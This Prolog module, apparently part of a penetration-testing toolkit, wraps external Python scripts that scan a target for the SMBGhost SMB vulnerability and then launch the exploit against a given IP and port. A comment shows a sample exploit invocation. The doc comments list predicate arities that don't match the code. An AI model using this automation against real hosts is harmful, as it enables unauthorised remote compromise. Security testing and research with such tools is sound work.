/** <smb_ghost.pl> Utilità per l'exploit SMBGhost
 *
 *  Questo modulo introduce diversi predicati di utilità 
 *  per il controllo della vulnerabilità SMBGhost e
 *  l'esecuzione dell'exploit relativo.
 *
 *  @author Mauro Andreolini
 *  @version 0.1
 */
:- module(smb_ghost, [
       check_vuln_smb_ghost/2,
       exploit_smb_ghost/2
]).

:- use_module(utils/command_runner).

% Percorsi degli script
scanner_script("/home/kali/working_directory/prolog-dev/wrappers/SMBGhost_AutomateExploitation/Smb_Ghost.py").
exploit_script("/home/kali/working_directory/0.SMBGhost/exploit.py").

%% check_vuln(+IP:string, +Port:number, +InputPipe:string, +OutputPipe:string) is semidet
%
%  Il predicato check_vuln/3 è un wrapper dello
%  script Python 3 memorizzato in scanner_script/1 che
%  verifica la presenza della vulnerabilità SMBGhost.
%
%  @param IP L'indirizzo IP del target.
%  @param Port La porta TCP del target.
%
check_vuln_smb_ghost(Target, Port) :-
	scanner_script(Script),
	run_command(
		"python3",
		[ Script, "-i", Target, "-p", Port, "--check" ],
		False,
		False,
		Stdout,
		_,
		ExitCode),
	ExitCode = 0,
	sub_string(Stdout, _, _, _, "The host is probably vulnerable").

%% exploit(+Target, +RHost, +RPort) is det.
%  Lancia l'exploit SMBGhost sul target specificato.
%  python3 ~/working_directory/0.SMBGhost/exploit.py -i 10.1.146.111 -p 445
exploit_smb_ghost(Target, SMBPort) :-
	exploit_script(Script),
	run_command("python3",
		[Script, "-i", Target, "--port", SMBPort],
		false,
		false,
		_,
		_,
		ExitCode),
	ExitCode == 0.
